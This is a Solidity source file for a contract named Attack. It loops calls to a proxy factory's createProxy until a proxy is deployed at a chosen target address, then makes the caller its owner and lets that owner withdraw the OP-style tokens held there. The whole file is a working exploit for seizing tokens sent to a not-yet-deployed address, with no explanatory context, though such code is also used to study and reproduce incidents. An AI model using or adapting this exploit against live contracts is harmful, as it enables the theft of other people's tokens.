pragma solidity ^0.5.3;

import "./ProxyFactory.sol";

interface IOPToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract Attack {
    // masterCopy always needs to be first declared variable, to ensure that it is at the same location as in the Proxy contract.
    // It should also always be ensured that the address is stored alone (uses a full word)
    address private _masterCopy;
    ProxyFactory private _factory;
    address public owner;
    address private _target;
    IOPToken private _token;
    bool public found;

    constructor(
        address factory,
        address target,
        address token
    ) public {
        _factory = ProxyFactory(factory);
        _target = target;
        _token = IOPToken(token);
    }

    function initialize(address token, address _owner) public {
        require(owner == address(0));
        owner = _owner;
        _token = IOPToken(token);
    }

    function replayDeploy() public {
        bytes memory callData = abi.encodeWithSelector(
            this.initialize.selector,
            address(_token),
            msg.sender
        );

        for (uint256 i = 1; i < 20; i++) {
            address result = address(_factory.createProxy(address(this), callData));
            if (result == _target) {
                found = true;
                break;
            }
        }
    }

    function withdrawToken(address _receiver, uint256 _amount) public {
        require(msg.sender == owner);
        _token.transfer(_receiver, _amount);
    }
}
